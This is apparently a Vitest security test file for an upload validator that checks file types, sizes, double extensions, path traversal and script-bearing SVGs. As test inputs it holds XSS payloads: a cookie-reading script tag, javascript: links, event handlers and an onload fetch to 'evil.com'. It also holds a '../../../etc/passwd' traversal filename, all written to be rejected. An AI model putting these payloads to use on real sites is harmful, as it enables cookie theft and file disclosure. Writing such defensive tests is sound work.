import { describe, it, expect } from 'vitest';
import { validateFileUpload } from '@/lib/validations/upload';

describe('Security Audit — File Upload Abuse & Anti-Malware Safeguards (SECURITY_PLAN §8, §15)', () => {
  it('accepts legitimate PDF and JPEG uploads for documents bucket', () => {
    const validPdf = validateFileUpload({
      filename: 'tax_invoice_INV001.pdf',
      mimeType: 'application/pdf',
      sizeBytes: 1024 * 500, // 500 KB
      bucket: 'documents',
    });
    expect(validPdf.valid).toBe(true);
    expect(validPdf.sanitizedFilename).toBe('tax_invoice_INV001.pdf');

    const validJpg = validateFileUpload({
      filename: 'receipt_scan.jpg',
      mimeType: 'image/jpeg',
      sizeBytes: 1024 * 800,
      bucket: 'documents',
    });
    expect(validJpg.valid).toBe(true);
  });

  it('accepts legitimate media and video uploads for portfolio bucket', () => {
    const validMp4 = validateFileUpload({
      filename: 'wedding_film_highlight.mp4',
      mimeType: 'video/mp4',
      sizeBytes: 50 * 1024 * 1024,
      bucket: 'portfolio',
    });
    expect(validMp4.valid).toBe(true);
  });

  it('rejects files without an extension', () => {
    const noExt = validateFileUpload({
      filename: 'unknownfile',
      mimeType: 'application/pdf',
      sizeBytes: 1024,
      bucket: 'documents',
    });
    expect(noExt.valid).toBe(false);
    expect(noExt.error).toContain('valid extension');
  });

  it('rejects oversized files exceeding bucket limits', () => {
    const oversized = validateFileUpload({
      filename: 'giant_archive.pdf',
      mimeType: 'application/pdf',
      sizeBytes: 25 * 1024 * 1024, // 25 MB > 15 MB limit
      bucket: 'documents',
    });
    expect(oversized.valid).toBe(false);
    expect(oversized.error).toContain('exceeds maximum allowed limit');
  });

  it('rejects invalid MIME types for documents bucket', () => {
    const badMime = validateFileUpload({
      filename: 'audio_recording.mp3',
      mimeType: 'audio/mpeg',
      sizeBytes: 1024,
      bucket: 'documents',
    });
    expect(badMime.valid).toBe(false);
    expect(badMime.error).toContain('not permitted for studio document storage');
  });

  it('rejects invalid MIME types for portfolio bucket', () => {
    const badMime = validateFileUpload({
      filename: 'raw_archive.zip',
      mimeType: 'application/zip',
      sizeBytes: 1024,
      bucket: 'portfolio',
    });
    expect(badMime.valid).toBe(false);
    expect(badMime.error).toContain('not permitted for media storage');
  });

  it('rejects executable and script file extensions', () => {
    const exe = validateFileUpload({
      filename: 'invoice.exe',
      mimeType: 'application/pdf',
      sizeBytes: 1024,
      bucket: 'documents',
    });
    expect(exe.valid).toBe(false);
    expect(exe.error).toContain('prohibited');

    const sh = validateFileUpload({
      filename: 'deploy.sh',
      mimeType: 'application/pdf',
      sizeBytes: 1024,
      bucket: 'documents',
    });
    expect(sh.valid).toBe(false);
  });

  it('rejects sneaky double extensions (e.g. photo.php.jpg)', () => {
    const doubleExt = validateFileUpload({
      filename: 'wedding_album.php.jpg',
      mimeType: 'image/jpeg',
      sizeBytes: 1024,
      bucket: 'portfolio',
    });
    expect(doubleExt.valid).toBe(false);
    expect(doubleExt.error).toContain('Double extensions');
  });

  it('blocks SVG uploads containing malicious JavaScript tags or event handlers', () => {
    const scriptSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <script>alert(document.cookie)</script>
      <circle cx="50" cy="50" r="40"/>
    </svg>`;

    const res = validateFileUpload({
      filename: 'logo.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: 1024,
      bucket: 'public_assets',
      fileContentText: scriptSvg,
    });
    expect(res.valid).toBe(false);
    expect(res.error).toContain('active script elements');

    const jsUrlSvg = `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)">Click</a></svg>`;
    const jsUrlRes = validateFileUpload({
      filename: 'link.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: 500,
      bucket: 'public_assets',
      fileContentText: jsUrlSvg,
    });
    expect(jsUrlRes.valid).toBe(false);

    const onloadSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com')"></svg>`;
    const onloadRes = validateFileUpload({
      filename: 'icon.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: 500,
      bucket: 'public_assets',
      fileContentText: onloadSvg,
    });
    expect(onloadRes.valid).toBe(false);

    const onerrorSvg = `<svg xmlns="http://www.w3.org/2000/svg"><image onerror="alert(1)"/></svg>`;
    const onerrorRes = validateFileUpload({
      filename: 'err.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: 500,
      bucket: 'public_assets',
      fileContentText: onerrorSvg,
    });
    expect(onerrorRes.valid).toBe(false);

    const onclickSvg = `<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)"/></svg>`;
    const onclickRes = validateFileUpload({
      filename: 'click.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: 500,
      bucket: 'public_assets',
      fileContentText: onclickSvg,
    });
    expect(onclickRes.valid).toBe(false);
  });

  it('accepts benign clean SVG uploads without active scripts', () => {
    const cleanSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#4C6452"/></svg>`;
    const res = validateFileUpload({
      filename: 'clean_logo.svg',
      mimeType: 'image/svg+xml',
      sizeBytes: 500,
      bucket: 'public_assets',
      fileContentText: cleanSvg,
    });
    expect(res.valid).toBe(true);
  });

  it('strips directory traversal paths from filename', () => {
    const traversal = validateFileUpload({
      filename: '../../../etc/passwd.pdf',
      mimeType: 'application/pdf',
      sizeBytes: 1024,
      bucket: 'documents',
    });
    expect(traversal.valid).toBe(true);
    expect(traversal.sanitizedFilename).not.toContain('..');
  });
});
